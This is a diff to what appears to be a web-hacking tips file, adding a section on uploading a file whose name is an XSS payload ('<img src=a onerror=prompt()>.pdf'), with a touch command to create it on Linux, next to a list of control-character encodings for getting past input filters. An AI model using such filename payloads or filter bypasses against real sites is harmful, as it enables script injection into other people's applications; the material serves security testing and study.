@@ -9,6 +9,18 @@ You shall not misuse the information to gain unauthorized access and/or write ma
 
 These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.
 
+
+Linux filenames and uploads
+==============
+This has been a trick I have used for years. When I am lazy, I find my trust file
+```html
+<img src=a onerror=prompt()>.pdf
+```
+Linux allows you to create this file. Windows, well they don't. Use this if you are lazy like me.
+```bash
+touch "<img src=a onerror=prompt()>.pdf"
+```
+
 Able to inject script, iframe, anchor but something is parsing your input?
 ==============
 %0A,%1A,%0B,%1B,%0C,%1C,%0D,%1D,%0E,%1E,%0F,%1F may be able to help you
